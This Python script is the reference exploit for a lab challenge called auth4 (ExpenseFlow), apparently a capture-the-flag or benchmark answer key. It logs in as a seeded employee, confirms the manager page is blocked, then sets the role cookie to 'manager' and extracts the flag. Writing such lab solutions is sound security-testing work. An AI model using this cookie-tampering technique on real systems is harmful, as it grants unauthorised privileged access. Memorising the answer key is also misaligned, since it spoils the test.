#!/usr/bin/env python3
"""Reference exploit for auth4 (ExpenseFlow).

Logs in as the seeded employee account, confirms /manager 403s with the
role cookie login sets, then edits that cookie to "manager" and retries --
no new credential, same employee session.
"""
import os
import re
import sys
import time
from urllib.parse import urlparse

import requests  # pip install requests

BASE = sys.argv[1] if len(sys.argv) > 1 else os.environ.get("BASE", "http://127.0.0.1:8063")


def wait_up(s: requests.Session) -> None:
    for _ in range(30):
        try:
            s.get(BASE, timeout=2)
            return
        except requests.RequestException:
            time.sleep(1)


def main() -> int:
    s = requests.Session()
    wait_up(s)

    r = s.post(f"{BASE}/login", data={"username": "employee", "password": "employee123"},
               timeout=5)
    role_cookie_name = next((c.name for c in s.cookies if "role" in c.name.lower()), None)
    if not role_cookie_name:
        sys.stderr.write("login did not set a role-like cookie\n")
        return 1

    # Pre-exploit: the unmodified post-login state must NOT reach the flag.
    r = s.get(f"{BASE}/manager", timeout=5)
    if r.status_code == 200 and "flag{" in r.text:
        sys.stderr.write("precondition failed: /manager reachable as plain employee\n")
        return 1

    host = urlparse(BASE).hostname
    s.cookies.set(role_cookie_name, "manager", domain=host, path="/")
    r = s.get(f"{BASE}/manager", timeout=5)
    m = re.search(r"flag\{[^}]+\}", r.text)
    if m:
        print(m.group(0))
        return 0

    sys.stderr.write("no flag found\n")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
